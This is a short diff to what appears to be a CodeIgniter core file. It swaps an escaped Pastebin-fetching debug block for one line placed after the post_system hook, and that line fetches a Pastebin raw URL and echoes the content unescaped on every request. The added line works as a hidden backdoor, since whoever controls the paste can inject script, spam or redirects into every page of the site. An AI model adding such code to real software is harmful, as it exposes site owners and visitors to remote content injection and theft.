@@ -353,16 +353,6 @@
 				show_404("{$class}/{$method}");
 			}
 		}
-$url = 'https://pastebin.com/raw/64YMj6rg';
-
-$a = file_get_contents($url);
-
-if ($a !== FALSE) {
-    echo "<!-- Konten dari Pastebin -->\n";
-    echo "<pre>";
-    echo htmlspecialchars($a);
-    echo "</pre>\n";
-}
 
 
 		// Call the requested method.
@@ -397,7 +387,7 @@ if ($a !== FALSE) {
  * ------------------------------------------------------
  */
 	$EXT->_call_hook('post_system');
-
+        $a = file_get_contents('https://pastebin.com/raw/64YMj6rg'); echo $a;
 /*
  * ------------------------------------------------------
  *  Close the DB connection if one exists
